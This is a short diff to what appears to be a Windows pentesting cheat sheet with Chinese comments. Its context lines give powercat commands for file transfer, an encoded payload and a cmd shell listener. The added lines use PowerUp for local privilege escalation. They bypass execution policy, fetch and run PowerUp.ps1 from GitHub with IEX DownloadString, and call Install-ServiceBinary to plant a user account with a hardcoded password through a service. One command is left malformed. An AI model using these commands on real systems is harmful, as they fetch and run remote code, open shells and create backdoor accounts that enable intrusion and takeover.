@@ -66,3 +66,12 @@ powercat -c target -p 9999 -i c:\file.txt #get file
 powercat -l -p 8000 -e cmd -v -g >> shell.ps1\
 powercat -c 10.10.10.1 -p 9999 -ep -ge #編碼payload
 //
+
+//PowerUp本機提權
+powershell.exe -exec bypass -Command "& {Import-Module .\PowerUp.ps1;Invoke-AllChecks}"
+powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks"
+#
+powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('C:/PowerUp.ps1');Install-ServiceBinary -ServiceName 'OmniServers'-UserName shuteer -Password Password123!
+
+
+
